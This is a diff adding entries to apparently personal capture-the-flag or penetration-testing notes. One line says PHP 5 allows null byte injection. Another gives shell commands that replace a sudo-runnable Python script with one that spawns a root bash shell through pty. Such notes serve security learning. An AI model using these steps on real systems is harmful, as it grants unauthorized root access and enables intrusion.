@@ -74,7 +74,16 @@ SPEECH TO TEXT CONVERTER
 `https://speech-to-text-demo.ng.bluemix.net/`
 
 
+*
+PHP 5 is vulnerable to "null byte injection" TL;DR adding '\00' in the end of command.
 
+*
+Becoming root with python script and with no read/write rights:
 
+`mv script.py script.py.bak` ---> renaming original script
+`echo "import pty" > script.py` ---> adding pty library = pseudo terminal utilities
+`echo "pty.spawn('/bin/bash')" >> script.py` ---> adding a spawn function
+
+and executing a script with path given in `sudo -l` e.g `sudo -u root /usr/bin/python /home/script.py`
 
 
